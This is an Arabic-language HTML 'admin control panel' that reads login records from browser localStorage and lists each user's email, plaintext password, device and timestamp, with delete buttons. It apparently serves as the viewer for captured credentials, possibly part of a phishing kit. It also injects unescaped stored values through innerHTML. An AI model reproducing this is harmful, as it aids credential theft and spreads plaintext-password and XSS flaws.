<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>لوحة تحكم المسؤول</title>
  <link rel="stylesheet" href="style.css">
  
  <style>
    /* تنسيق الصفحة الرئيسية */
    body {
      font-family: Arial, sans-serif;
      background-color: black;
      color: rgb(255, 255, 255);
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      overflow: hidden;
    }

    /* خلفية متحركة */
    .animated-background {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(45deg, #ff8000, #ffd700, #00aaff, #0040ff);
      background-size: 400% 400%;
      animation: gradientAnimation 15s ease infinite;
      z-index: -1;
    }

    @keyframes gradientAnimation {
      0% {
        background-position: 0% 50%;
      }
      50% {
        background-position: 100% 50%;
      }
      100% {
        background-position: 0% 50%;
      }
    }

    .logo {
      text-align: center;
      font-size: 2.5em;
      color: #fff;
      text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.6);
    }

    /* لوحة البيانات */
    .login-records {
      margin-top: 20px;
      background-color: rgba(0, 0, 0, 0.26);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.6);
      width: 80%;
      max-width: 800px;
      overflow-y: auto;
    }

    .record {
      margin: 10px 0;
      padding: 10px;
      background-color: #212121;
      border-radius: 10px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .delete-button {
      background-color: red;
      color: white;
      border: none;
      padding: 5px 10px;
      border-radius: 5px;
      cursor: pointer;
      font-size: 1em;
    }

    .delete-button:hover {
      background-color: darkred;
    }
  </style>

  <script>
    // الكود لعرض بيانات الدخول من الـ LocalStorage
    function displayLoginData() {
      const logins = JSON.parse(localStorage.getItem("logins")) || [];
      const loginsList = document.getElementById("loginsList");

      logins.forEach((login, index) => {
        const loginItem = document.createElement("div");
        loginItem.classList.add("record");

        loginItem.innerHTML = `
          <span>البريد الإلكتروني: ${login.email} | كلمة السر: ${login.password} | الجهاز: ${login.device} | وقت الدخول: ${login.timestamp}</span>
          <button class="delete-button" onclick="deleteLogin(${index})">حذف</button>
        `;

        loginsList.appendChild(loginItem);
      });
    }

    // دالة لحذف تسجيل الدخول
    function deleteLogin(index) {
      const logins = JSON.parse(localStorage.getItem("logins")) || [];
      logins.splice(index, 1);  // إزالة العنصر من القائمة
      localStorage.setItem("logins", JSON.stringify(logins));  // تحديث الـ LocalStorage

      // إعادة تحميل البيانات بعد الحذف
      document.getElementById("loginsList").innerHTML = "";
      displayLoginData();
    }

    window.onload = function() {
      displayLoginData();  // عرض بيانات تسجيل الدخول عند تحميل الصفحة
    };
  </script>
</head>
<body>
  <div class="animated-background"></div>

  <h1 class="logo">🌐 [Strine] لوحة تحكم المسؤول - الملكة</h1>

  <div class="login-records">
    <h2>بيانات الدخول:</h2>
    <div id="loginsList">
      <!-- سيتم عرض بيانات تسجيل الدخول هنا -->
    </div>
  </div>
</body>
</html>
